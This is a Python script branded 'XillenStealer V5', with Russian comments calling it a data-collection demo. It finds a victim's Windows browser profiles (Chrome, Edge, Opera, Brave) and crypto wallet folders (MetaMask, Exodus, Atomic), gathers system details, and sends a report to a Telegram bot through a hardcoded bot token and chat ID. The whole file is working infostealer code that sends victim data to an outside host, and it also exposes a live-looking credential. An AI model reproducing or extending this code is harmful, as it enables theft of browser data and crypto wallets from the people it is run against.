#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XillenStealer V5 - Test Collector
Демонстрация сбора данных
"""

import os
import json
import sqlite3
import requests
from pathlib import Path

def get_system_info():
    """Получить системную информацию"""
    import platform
    return {
        "os": platform.system(),
        "version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor()
    }

def collect_browsers():
    """Собрать данные из браузеров"""
    browsers = {
        "Chrome": os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data"),
        "Edge": os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data"),
        "Opera": os.path.expanduser("~\\AppData\\Roaming\\Opera Software\\Opera Stable"),
        "Brave": os.path.expanduser("~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data"),
    }
    
    found = []
    for name, path in browsers.items():
        if os.path.exists(path):
            found.append({
                "name": name,
                "path": path,
                "profiles": len([d for d in os.listdir(path) if os.path.isdir(os.path.join(path, d))])
            })
    
    return found

def collect_wallets():
    """Собрать данные из кошельков"""
    wallets = {
        "MetaMask": os.path.expanduser("~\\AppData\\Roaming\\MetaMask"),
        "Exodus": os.path.expanduser("~\\AppData\\Roaming\\Exodus"),
        "Atomic": os.path.expanduser("~\\AppData\\Roaming\\atomic"),
    }
    
    found = []
    for name, path in wallets.items():
        if os.path.exists(path):
            found.append({"name": name, "path": path})
    
    return found

def main():
    print("=" * 60)
    print("XILLENSTEALER V5 - DATA COLLECTOR")
    print("=" * 60)
    print()
    
    # Сбор данных
    print("[*] Collecting system information...")
    system_info = get_system_info()
    print(f"[+] OS: {system_info['os']} {system_info['version']}")
    print(f"[+] Machine: {system_info['machine']}")
    print()
    
    print("[*] Collecting browser data...")
    browsers = collect_browsers()
    print(f"[+] Found {len(browsers)} browsers:")
    for browser in browsers:
        print(f"    - {browser['name']}: {browser['profiles']} profiles")
    print()
    
    print("[*] Collecting wallet data...")
    wallets = collect_wallets()
    print(f"[+] Found {len(wallets)} wallets:")
    for wallet in wallets:
        print(f"    - {wallet['name']}")
    print()
    
    # Отправка в Telegram
    print("[*] Sending data to Telegram...")
    token = "8474305805:AAHZ98s7nr9IAFQehnqh0x3iGV1OmVhTq9I"
    chat_id = "7368280792"
    
    message = f"""🔥 XILLENSTEALER V5 - DATA COLLECTED

📊 SYSTEM INFO:
OS: {system_info['os']} {system_info['version']}
Machine: {system_info['machine']}

🌐 BROWSERS FOUND: {len(browsers)}
{chr(10).join([f'  - {b["name"]} ({b["profiles"]} profiles)' for b in browsers])}

💰 WALLETS FOUND: {len(wallets)}
{chr(10).join([f'  - {w["name"]}' for w in wallets])}

✅ Collection complete!
"""
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {"chat_id": chat_id, "text": message}
    
    try:
        response = requests.post(url, json=data, timeout=10)
        if response.status_code == 200:
            print("[+] SUCCESS! Data sent to Telegram!")
            print(f"[+] Message ID: {response.json()['result']['message_id']}")
        else:
            print(f"[!] Error: {response.status_code}")
    except Exception as e:
        print(f"[!] Error sending to Telegram: {e}")
    
    print()
    print("=" * 60)
    print("Press Enter to exit...")
    input()

if __name__ == "__main__":
    main()
